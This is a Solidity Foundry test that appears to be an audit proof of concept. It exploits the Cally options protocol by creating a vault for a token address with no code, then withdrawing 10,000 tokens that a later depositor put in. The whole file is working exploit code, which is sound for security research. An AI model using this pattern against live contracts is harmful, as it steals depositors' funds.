// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

// Forge Std
import "forge-std/Test.sol";

// Target contracts
import "src/Cally.sol";

// Import solmate ERC20 implementation that Cally expects
import {ERC20} from "solmate/tokens/ERC20.sol";

contract MintableERC20 is ERC20 {
    constructor() ERC20("TokenB", "TB", 18) {}

    /// @notice permissionless mint helper for the test
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract ExploitTest is Test {
    // Actors
    address attacker = address(0xA11CE);
    address alice    = address(0xB0B);

    // Contracts
    Cally cally;

    // Deterministic token address that is *empty* when attacker creates the vault
    address constant TOKEN_ADDR = address(0xBEEF);

    // Amounts
    uint256 constant ATTACKER_FAKE_AMOUNT = 10_000 ether;
    uint256 constant ALICE_DEPOSIT_AMOUNT = 11_000 ether;

    function setUp() public {
        // Give actors some ETH for tx fees
        vm.deal(attacker, 100 ether);
        vm.deal(alice,    100 ether);

        // Deploy Cally
        cally = new Cally();
    }

    function testExploitFakeTokenAddress() public {
        /*====================================================
        == Stage 1: Attacker sets the trap (no code at address)
        ====================================================*/

        // The "token" address currently contains no code
        assertEq(TOKEN_ADDR.code.length, 0, "Precondition failed: TOKEN_ADDR already has code");

        // Attacker creates a vault with a *non-existent* token contract.
        vm.startPrank(attacker);
        uint256 attackerVaultId = cally.createVault(
            ATTACKER_FAKE_AMOUNT,   // tokenIdOrAmount
            TOKEN_ADDR,             // fake token address (no code)
            0,                      // premiumIndex (valid)
            1,                      // durationDays
            0,                      // dutchAuctionStartingStrikeIndex
            0.5 ether,              // dutchAuctionReserveStrike ( < 1 ether )
            Cally.TokenType.ERC20   // token type
        );
        vm.stopPrank();

        /*====================================================
        == Stage 2: Legit project launches the real token   ==
        ====================================================*/

        // Deploy a real ERC20 implementation somewhere to get its runtime bytecode
        MintableERC20 implementation = new MintableERC20();
        bytes memory erc20RuntimeCode = address(implementation).code;

        // "Launch" TokenB at the predefined TOKEN_ADDR by etching the runtime code.
        // This simulates a future deployment of a legitimate token at the SAME address.
        vm.etch(TOKEN_ADDR, erc20RuntimeCode);
        assertGt(TOKEN_ADDR.code.length, 0, "Code not etched correctly");

        // Make the interface to interact with the freshly deployed token
        MintableERC20 tokenB = MintableERC20(TOKEN_ADDR);

        // Mint tokens to Alice so she can legitimately create her own vault later
        tokenB.mint(alice, ALICE_DEPOSIT_AMOUNT);

        /*====================================================
        == Stage 3: Alice interacts with the protocol       ==
        ====================================================*/

        vm.startPrank(alice);
        // Alice approves Cally to pull her tokens
        tokenB.approve(address(cally), type(uint256).max);

        // Alice creates a *real* vault, transferring tokens to Cally
        uint256 aliceVaultId = cally.createVault(
            ALICE_DEPOSIT_AMOUNT,
            TOKEN_ADDR,
            0,
            1,
            0,
            0.5 ether,
            Cally.TokenType.ERC20
        );
        vm.stopPrank();

        // At this point, Cally contract rightfully holds Alice's 11,000 TokenB
        assertEq(tokenB.balanceOf(address(cally)), ALICE_DEPOSIT_AMOUNT);

        /*====================================================
        == Stage 4: Attacker springs the trap               ==
        ====================================================*/

        // Attacker starts the withdrawal process
        vm.startPrank(attacker);
        cally.initiateWithdraw(attackerVaultId);

        // Fast-forward time so that the (never-sold) option expires
        vm.warp(block.timestamp + 2 days);

        // Withdraw â€“ this will transfer ATTACKER_FAKE_AMOUNT TokenB from Cally to attacker
        cally.withdraw(attackerVaultId);
        vm.stopPrank();

        /*====================================================
        == Verification                                     ==
        ====================================================*/

        // Attacker successfully steals 10,000 TokenB that Alice deposited
        assertEq(tokenB.balanceOf(attacker), ATTACKER_FAKE_AMOUNT, "Exploit failed - attacker balance incorrect");

        // Cally no longer holds the stolen amount, only Alice's remaining 1,000 TokenB
        assertEq(tokenB.balanceOf(address(cally)), ALICE_DEPOSIT_AMOUNT - ATTACKER_FAKE_AMOUNT, "Protocol balance mismatch");
    }
}
